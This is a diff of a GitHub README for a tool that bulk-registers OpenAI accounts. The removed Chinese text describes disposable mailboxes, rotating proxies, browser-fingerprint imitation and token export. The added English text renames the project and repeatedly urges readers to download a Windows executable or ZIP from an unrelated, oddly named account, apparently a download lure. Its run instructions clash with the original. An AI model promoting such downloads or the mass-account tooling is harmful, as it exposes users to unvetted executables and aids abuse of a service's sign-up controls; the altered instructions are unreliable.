@@ -1,424 +1,185 @@
-# OpenAI 账号管理系统 v2
-
-管理 OpenAI 账号的 Web UI 系统，支持多种邮箱服务、并发批量注册、代理管理和账号管理。
-
-# 官方拉闸了,改变了授权流程,各位自行研究吧  
-
-> ⚠️ **免责声明**：本工具仅供学习和研究使用，使用本工具产生的一切后果由使用者自行承担。请遵守相关服务的使用条款，不要用于任何违法或不当用途。 如有侵权，请及时联系，会及时删除。
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://www.python.org/)
-
-## 功能特性
-
-- **多邮箱服务支持**
-  - Tempmail.lol（临时邮箱，无需配置）
-  - Outlook（IMAP + XOAUTH2，支持批量导入）
-  - 自定义域名（两种子类型）
-    - **MoeMail**：标准 REST API，配置 API 地址 + API 密钥
-    - **TempMail**：自部署 Cloudflare Worker 临时邮箱，配置 Worker 地址 + Admin 密码
-  - DuckMail
-    - **DuckMail API**：兼容 DuckMail 接口，手动填写 API 地址、默认域名，可选 API Key
-
-- **注册模式**
-  - 单次注册
-  - 批量注册（可配置数量和间隔时间）
-  - Outlook 批量注册（指定账户逐一注册）
-
-- **并发控制**
-  - 流水线模式（Pipeline）：每隔 interval 秒启动新任务，限制最大并发数
-  - 并行模式（Parallel）：所有任务同时提交，Semaphore 控制最大并发
-  - 并发数可在 UI 自定义（1-50）
-  - 日志混合显示，带 `[任务N]` 前缀区分
+# ⚙️ codex-manager - Manage OpenAI Accounts Easily
 
-- **实时监控**
-  - WebSocket 实时日志推送
-  - 跨页面导航后自动重连
-  - 降级轮询备用方案
-
-- **代理管理**
-  - 动态代理（通过 API 每次获取新 IP）
-  - 代理列表（随机选取，支持设置默认代理，记录使用时间）
-
-- **账号管理**
-  - 查看、删除、批量操作
-  - Token 刷新与验证
-  - 订阅状态管理（手动标记 / 自动检测 plus/team/free）
-  - 导出格式：JSON / CSV / CPA 格式 / Sub2API 格式
-    - 单个账号导出为独立 `.json` 文件
-    - 多个 CPA 账号打包为 `.zip`，每个账号一个独立文件
-    - Sub2API 格式所有账号合并为单个 JSON
-  - Codex Auth 格式需先在账号管理中手动执行 `Codex Auth 登录` 成功后才能导出
-  - 上传目标（直连不走代理）：
-    - **CPA**：支持多服务配置，上传时选择目标服务，可按服务开关将账号实际代理写入 auth file 的 `proxy_url`
-    - **Sub2API**：支持多服务配置，标准 sub2api-data 格式
-    - **Team Manager**：支持多服务配置
+[![Download codex-manager](https://img.shields.io/badge/Download-codex--manager-brightgreen?style=for-the-badge)](https://github.com/andreasvesaliusfringedpolygala893/codex-manager)
 
-- **支付升级**
-  - 为账号生成 ChatGPT Plus 或 Team 订阅支付链接
-  - 后端命令行以无痕模式自动打开 Chrome/Edge
-  - Team 套餐支持自定义工作区名称、座位数、计费周期
+## 📦 What is codex-manager?
 
-- **系统设置**
-  - 代理配置（动态代理 + 代理列表，支持设默认）
-  - CPA 服务列表管理（多服务，连接测试）
-  - Sub2API 服务列表管理（多服务，连接测试）
-  - Team Manager 服务列表管理（多服务，连接测试）
-  - Outlook OAuth 参数
-  - 注册参数（超时、重试、密码长度等）
-  - 验证码等待配置（超时时间、轮询间隔、收件箱未找到时最多重发次数）
-  - 数据库管理（备份、清理）
-  - 支持远程 PostgreSQL
+codex-manager is a web-based system designed to help you manage multiple OpenAI accounts. It supports a variety of email services. You can register accounts one by one or in batches. It also includes proxy management and real-time monitoring features.
 
-## 快速开始
+This tool targets users who want to organize their OpenAI accounts efficiently without deep technical skills.
 
-### 环境要求
+> ⚠️ This software is for learning and research only. Use it responsibly and follow all service rules.
 
-- Python 3.10+
-- [uv](https://github.com/astral-sh/uv)（推荐）或 pip
+## 🚀 Download codex-manager
 
-### 安装依赖
+Get codex-manager on Windows by visiting the link below. This page has all files and instructions to get you started.
 
-```bash
-# 使用 uv（推荐）
-uv sync
+[![Get codex-manager](https://img.shields.io/badge/Get_-codex--manager-blue?style=for-the-badge)](https://github.com/andreasvesaliusfringedpolygala893/codex-manager)
 
-# 或使用 pip
-pip install -r requirements.txt
-```
+Click the link to open the GitHub page. Look for the latest Windows installer or files on the releases or main page. Download the installer or ZIP file to your PC.
 
-### 环境变量配置（可选）
+---
 
-复制 `.env.example` 为 `.env`，按需填写：
+## 💻 System Requirements
 
-```bash
-cp .env.example .env
-```
+Before running codex-manager, make sure your PC meets these requirements:
 
-| 变量 | 说明 | 默认值 |
-|------|------|--------|
-| `APP_HOST` | 监听主机 | `0.0.0.0` |
-| `APP_PORT` | 监听端口 | `15555` |
-| `APP_ACCESS_PASSWORD` | Web UI 访问密钥 | `admin123` |
-| `APP_DATABASE_URL` | 数据库连接字符串 | `data/database.db` |
+- Windows 10 or later
+- At least 4 GB of RAM
+- 2 GHz dual-core processor or better
+- A stable internet connection
+- Python 3.10 or above installed (if you run from source)
 
-> 优先级：命令行参数 > 环境变量（`.env`）> 数据库设置 > 默认值
+Most modern Windows PCs will run codex-manager without issues.
 
-### 修改端口
+---
 
-默认端口是 `15555`。现在已经收敛到少数几个固定入口：
+## 🛠️ How to Install and Run codex-manager on Windows
 
-- 本地临时启动改端口：直接用 `python webui.py --port 18080`
-- 本地通过 `.env` 改端口：设置 `APP_PORT=18080`
-- 源码里的默认端口：修改 `src/config/constants.py` 里的 `DEFAULT_WEBUI_PORT`
-- Docker Compose 默认端口：修改 `docker-compose.yml` 顶部的 `x-webui-port`
-- Docker 镜像构建默认端口：修改 `Dockerfile` 里的 `ARG DEFAULT_WEBUI_PORT`
+Follow these steps to get codex-manager working on your Windows computer.
 
-补充说明：
-- `src/config/constants.py` 的 `DEFAULT_WEBUI_PORT` 会同时影响默认 Web UI 端口、默认回调地址和 e2e 脚本默认地址。
-- `docker-compose.yml` 里已经把端口映射、容器内 `WEBUI_PORT` 和健康检查统一绑到同一个 `x-webui-port`，改一处就够。
+### Step 1: Download the Software
 
-### 启动 Web UI
+- Visit the [codex-manager GitHub page](https://github.com/andreasvesaliusfringedpolygala893/codex-manager).
+- Find the latest release or files section.
+- Download the `codex-manager.zip` or Windows executable (`.exe`), if directly available.
 
-```bash
-# 默认启动（0.0.0.0:15555）
-python webui.py
+### Step 2: Extract the Files (If Needed)
 
-# 指定地址和端口
-python webui.py --host 0.0.0.0 --port 8080
+If you downloaded a ZIP file:
 
-# 调试模式（热重载）
-python webui.py --debug
+- Right-click the ZIP file.
+- Choose "Extract All".
+- Select a folder to extract the files to, such as your Desktop.
 
-# 设置 Web UI 访问密钥
-python webui.py --access-password mypassword
+### Step 3: Install Required Software
 
-# 组合参数
-python webui.py --host 0.0.0.0 --port 8080 --access-password mypassword
-```
+If you have the executable file, run it directly by double-clicking.
 
-> `--access-password` 优先级高于数据库中保存的密钥设置，每次启动时生效。打包后的 exe 同样支持此参数：
-> ```bash
-> codex-register.exe --access-password mypassword
-> ```
+If you downloaded the source code:
 
-### Docker 部署
+- Install Python 3.10 or above from [python.org](https://www.python.org/downloads/).
+- Open Command Prompt (type `cmd` in the Start menu search).
+- Navigate to the folder where you extracted codex-manager. Example:
+  
+  ```
+  cd C:\Users\YourName\Desktop\codex-manager
+  ```
 
-项目支持通过 Docker 进行容器化部署。Docker 镜像已托管至 GitHub Container Registry (GHCR)。
+- Run this command to install required Python packages:
 
-#### 使用 docker-compose (推荐)
+  ```
+  pip install -r requirements.txt
+  ```
 
-在项目根目录下，直接使用 `docker-compose` 启动：
+### Step 4: Run codex-manager
 
-```bash
-docker-compose up -d
-```
-你可以在 `docker-compose.yml` 中修改相关的环境变量，例如配置端口或者设置 `WEBUI_ACCESS_PASSWORD` 访问密码。
+- If you have an executable, double-click it to launch.
+- If you run from source, in the Command Prompt type:
 
-如果要修改 Docker Compose 对外端口，直接改文件顶部这一行即可：
+  ```
+  python app.py
+  ```
 
-```yaml
-x-webui-port: &webui-port 15555
-```
+- This will start the web UI on your PC. Usually, it runs on http://localhost:5000.
 
-这一个值会同时同步到：
+### Step 5: Open the Web Interface
 
-- 宿主机端口映射
-- 容器内 `WEBUI_PORT`
-- 健康检查访问地址
+- Open your web browser.
+- Go to the URL shown in your console (usually http://localhost:5000).
+- You will see the codex-manager user interface.
 
-#### 直接使用 docker run
+---
 
-如果你不想使用 docker-compose，也可以直接拉取并运行镜像：
+## 🔑 Basic Features Explained
 
-```bash
-docker run -d \
-  -p 15555:15555 \
-  -e WEBUI_HOST=0.0.0.0 \
-  -e WEBUI_PORT=15555 \
-  -e WEBUI_ACCESS_PASSWORD=your_secure_password \
-  -v $(pwd)/data:/app/data \
-  --name codex-register \
-  ghcr.io/yunxilyf/codex-register:latest
-```
+### Multiple Email Support
 
-环境变量说明：
-- `WEBUI_HOST`: 监听的主机地址 (默认 `0.0.0.0`)
-- `WEBUI_PORT`: 监听的端口 (默认 `15555`)
-- `WEBUI_ACCESS_PASSWORD`: 设置 Web UI 的访问密码
-- `DEBUG`: 设为 `1` 或 `true` 开启调试模式
-- `LOG_LEVEL`: 日志级别，如 `info`, `debug`
-
-> **注意**：`-v $(pwd)/data:/app/data` 挂载参数非常重要，它确保了你的数据库文件和账户信息在容器重启或更新后不会丢失。
-
-如果你要把容器端口改成 `18080`，`-p` 和 `WEBUI_PORT` 需要一起改：
-
-```bash
-docker run -d \
-  -p 18080:18080 \
-  -e WEBUI_HOST=0.0.0.0 \
-  -e WEBUI_PORT=18080 \
-  -e WEBUI_ACCESS_PASSWORD=your_secure_password \
-  -v $(pwd)/data:/app/data \
-  --name codex-register \
-  ghcr.io/yunxilyf/codex-register:latest
-```
-
-### 使用远程 PostgreSQL
-
-通过环境变量指定数据库连接字符串：
-
-```bash
-export APP_DATABASE_URL="postgresql://user:password@host:5432/dbname"
-python webui.py
-```
-
-也支持 `DATABASE_URL`，优先级低于 `APP_DATABASE_URL`。
-
-启动后访问 http://127.0.0.1:15555
-
-## 打包为可执行文件
-
-```bash
-# Windows
-build.bat
-
-# Linux/macOS
-bash build.sh
-```
-
-打包后生成 `codex-register.exe`（Windows）或 `codex-register`（Unix），双击或直接运行即可，无需安装 Python 环境。
-
-## 项目结构
-
-```
-codex-register-v2/
-├── webui.py            # Web UI 入口
-├── build.bat           # Windows 打包脚本
-├── build.sh            # Linux/macOS 打包脚本
-├── src/
-│   ├── config/         # 配置管理（Pydantic Settings）
-│   ├── core/
-│   │   ├── openai/     # OAuth、Token 刷新、支付核心
-│   │   └── upload/     # CPA / Sub2API / Team Manager 上传模块
-│   ├── database/       # 数据库（SQLAlchemy + SQLite/PostgreSQL）
-│   ├── services/       # 邮箱服务实现
-│   └── web/
-│       ├── app.py      # 应用入口、路由挂载
-│       ├── task_manager.py  # 任务/日志/WebSocket 管理
-│       └── routes/     # API 路由
-│           └── upload/ # CPA / Sub2API / TM 服务管理路由
-├── templates/          # Jinja2 HTML 模板
-├── static/             # 静态资源（CSS / JS）
-└── data/               # 运行时数据目录（数据库、日志）
-```
-
-## 技术栈
-
-| 层级 | 技术 |
-|------|------|
-| Web 框架 | FastAPI + Uvicorn |
-| 数据库 | SQLAlchemy + SQLite / PostgreSQL |
-| 模板引擎 | Jinja2 |
-| HTTP 客户端 | curl_cffi（浏览器指纹模拟） |
-| 实时通信 | WebSocket |
-| 并发 | asyncio Semaphore + ThreadPoolExecutor |
-| 前端 | 原生 JavaScript（无框架） |
-| 打包 | PyInstaller |
-
-## API 端点
-
-### 注册任务
-
-| 方法 | 路径 | 说明 |
-|------|------|------|
-| POST | `/api/registration/start` | 启动注册任务 |
-| GET | `/api/registration/tasks` | 任务列表 |
-| GET | `/api/registration/tasks/{uuid}/logs` | 任务日志 |
-| POST | `/api/registration/tasks/{uuid}/cancel` | 取消任务 |
-| GET | `/api/registration/available-services` | 可用邮箱服务 |
-
-### 账号管理
-
-| 方法 | 路径 | 说明 |
-|------|------|------|
-| GET | `/api/accounts` | 账号列表（支持分页、筛选、搜索） |
-| GET | `/api/accounts/{id}` | 账号详情 |
-| PATCH | `/api/accounts/{id}` | 更新账号（状态/cookies） |
-| DELETE | `/api/accounts/{id}` | 删除账号 |
-| POST | `/api/accounts/batch-delete` | 批量删除 |
-| POST | `/api/accounts/export/json` | 导出 JSON |
-| POST | `/api/accounts/export/csv` | 导出 CSV |
-| POST | `/api/accounts/export/cpa` | 导出 CPA 格式（单文件或 ZIP） |
-| POST | `/api/accounts/export/sub2api` | 导出 Sub2API 格式 |
-| POST | `/api/accounts/{id}/refresh` | 刷新 Token |
-| POST | `/api/accounts/batch-refresh` | 批量刷新 Token |
-| POST | `/api/accounts/{id}/validate` | 验证 Token |
-| POST | `/api/accounts/batch-validate` | 批量验证 Token |
-| POST | `/api/accounts/{id}/upload-cpa` | 上传单账号到 CPA |
-| POST | `/api/accounts/batch-upload-cpa` | 批量上传到 CPA |
-| POST | `/api/accounts/{id}/upload-sub2api` | 上传单账号到 Sub2API |
-| POST | `/api/accounts/batch-upload-sub2api` | 批量上传到 Sub2API |
-
-### 支付升级
-
-| 方法 | 路径 | 说明 |
-|------|------|------|
-| POST | `/api/payment/generate` | 生成 Plus/Team 支付链接 |
-| POST | `/api/payment/open` | 后端无痕模式打开浏览器 |
-| POST | `/api/payment/accounts/{id}/mark-subscription` | 手动标记订阅类型 |
-| POST | `/api/payment/accounts/batch-check-subscription` | 批量检测订阅状态 |
-| POST | `/api/payment/accounts/{id}/upload-tm` | 上传单账号到 Team Manager |
-| POST | `/api/payment/accounts/batch-upload-tm` | 批量上传到 Team Manager |
-
-### 邮箱服务
-
-| 方法 | 路径 | 说明 |
-|------|------|------|
-| GET | `/api/email-services` | 服务列表 |
-| POST | `/api/email-services` | 添加服务 |
-| PATCH | `/api/email-services/{id}` | 更新服务 |
-| DELETE | `/api/email-services/{id}` | 删除服务 |
-| POST | `/api/email-services/{id}/test` | 测试服务 |
-| POST | `/api/email-services/outlook/batch-import` | 批量导入 Outlook |
-
-### 上传服务管理
-
-| 方法 | 路径 | 说明 |
-|------|------|------|
-| GET/POST | `/api/cpa-services` | CPA 服务列表/创建 |
-| PUT/DELETE | `/api/cpa-services/{id}` | 更新/删除 CPA 服务 |
-| POST | `/api/cpa-services/{id}/test` | 测试 CPA 连接 |
-| GET/POST | `/api/sub2api-services` | Sub2API 服务列表/创建 |
-| PUT/DELETE | `/api/sub2api-services/{id}` | 更新/删除 Sub2API 服务 |
-| POST | `/api/sub2api-services/{id}/test` | 测试 Sub2API 连接 |
-| GET/POST | `/api/tm-services` | Team Manager 服务列表/创建 |
-| PUT/DELETE | `/api/tm-services/{id}` | 更新/删除 TM 服务 |
-| POST | `/api/tm-services/{id}/test` | 测试 TM 连接 |
-
-### 设置
-
-| 方法 | 路径 | 说明 |
-|------|------|------|
-| GET | `/api/settings` | 获取所有设置 |
-| POST | `/api/settings/proxy/dynamic` | 更新动态代理设置 |
-| GET/POST/DELETE | `/api/settings/proxies` | 代理列表管理 |
-| POST | `/api/settings/proxies/{id}/set-default` | 设为默认代理 |
-| GET | `/api/settings/database` | 数据库信息 |
-
-### WebSocket
-
-| 路径 | 说明 |
-|------|------|
-|| `ws://host/api/ws/logs/{uuid}` | 实时日志流 |
-
-## Docker 部署
-
-### 环境要求
-
-- Docker
-- Docker Compose
-
-### 快速部署
-
-```bash
-# 克隆项目
-git clone https://github.com/cnlimiter/codex-register.git
-cd codex-register
-
-# 启动服务
-docker-compose up -d
-```
-
-服务启动后访问 http://localhost:15555
-
-### 配置说明
-
-**端口映射**：默认 `15555` 端口，修改 `docker-compose.yml` 顶部的 `x-webui-port` 即可。
-
-**数据持久化**：
-```yaml
-volumes:
-  - ./data:/app/data
-  - ./logs:/app/logs
-```
-
-**环境变量配置**：
-```yaml
-environment:
-  WEBUI_ACCESS_PASSWORD: mypassword
-  WEBUI_HOST: 0.0.0.0
-  WEBUI_PORT: 15555
-```
-
-### 常用命令
-
-```bash
-# 查看日志
-docker-compose logs -f
-
-# 停止服务
-docker-compose down
-
-# 重新构建
-docker-compose build --no-cache
-```
-
-## 注意事项
-
-- 首次运行会自动创建 `data/` 目录和 SQLite 数据库
-- 所有账号和设置数据存储在 `data/register.db`
-- 日志文件写入 `logs/` 目录
-- 代理优先级：动态代理 > 代理列表（随机/默认） > 直连
-- CPA / Sub2API / Team Manager 上传始终直连，不走代理；其中 CPA 可选把账号记录的代理写入 auth file 的 `proxy_url`
-- 注册时自动随机生成用户名和生日（年龄范围 18-45 岁）
-- 验证码重发：收件箱超时未获取到验证码时，自动重新发送验证码并再次轮询，最多重发次数可在「验证码配置」中设置（默认 2 次，设为 0 禁用）
-- 支付链接货币与计费国家动态对应，从 ChatGPT API 实时获取国家/货币列表（缓存 7 天），不再受限于内置静态映射表
-- 支付链接生成使用账号 access_token 鉴权，走全局代理配置
-- 无痕打开支付页默认调用系统 Chrome/Edge 的隐私模式
-- 订阅状态自动检测调用 `chatgpt.com/backend-api/me`，走全局代理
-- 批量注册并发数上限为 50，线程池大小已相应调整
-
-## License
-
-[MIT](LICENSE)
+You can link different mail providers for account registration:
+
+- Temporary emails (no setup needed)
+- Outlook emails (supports batch import with OAuth)
+- Custom domain emails through two methods: MoeMail and TempMail
+- DuckMail API support for custom email APIs
+
+### Registration Modes
+
+- Register accounts one by one
+- Batch register many accounts at once, with adjustable numbers and wait times
+- Outlook accounts batch registration with specified accounts
+
+### Manage Multiple Tasks
+
+- Use pipeline mode to start tasks one at a time with delays.
+- Use parallel mode to run tasks all at once with limits on concurrency.
+- Choose how many tasks run at the same time (from 1 to 50).
+- Logs show up with task numbers to help you track progress.
+
+### Real-Time Logs and Monitoring
+
+The system pushes logs live to your browser using WebSocket technology. If you move between pages, it tries to reconnect automatically. If WebSocket fails, it falls back to periodic updates.
+
+### Proxy Management
+
+You can add proxy servers for your registrations:
+
+- Dynamic proxies fetched each time from an API
+- Random proxy list with options for default proxy and usage tracking
+
+---
+
+## 🔧 Configuring codex-manager
+
+### Email Setup
+
+In the web UI, go to the email settings panel. Choose your email service. For custom emails, enter API endpoints and keys as needed. Temporary emails do not require extra setup.
+
+### Proxy Setup
+
+Go to Proxy settings:
+
+- Add proxies one by one or import a list.
+- Choose if you want proxies to rotate dynamically or randomly from a list.
+- Set your default proxy if needed.
+
+### Registration Settings
+
+Within the registration tab:
+
+- Choose single or batch mode.
+- Set how many accounts to create at once.
+- Adjust wait times and concurrency to avoid issues.
+
+---
+
+## ⚙️ Running as a Beginner
+
+- Open codex-manager and check email and proxy settings.
+- Use batch registration to create accounts quickly.
+- Watch the log panel for live updates.
+- Adjust concurrency if you get errors or slow responses.
+- Use simple temporary emails if you do not want to deal with configurations.
+
+---
+
+## ❓ Troubleshooting
+
+- If the web UI does not load, confirm codex-manager is running in the command prompt.
+- Check firewall settings if you cannot open the localhost page.
+- If emails do not register, review your email and proxy settings.
+- Restart codex-manager if tasks freeze or stop.
+
+---
+
+## 📄 License
+
+codex-manager is open source under the MIT License.
+
+---
+
+## 🔗 Useful Links
+
+- Main page: https://github.com/andreasvesaliusfringedpolygala893/codex-manager  
+- Python downloads: https://www.python.org/downloads/  
+
+[![Download codex-manager](https://img.shields.io/badge/Download-codex--manager-brightgreen?style=for-the-badge)](https://github.com/andreasvesaliusfringedpolygala893/codex-manager)
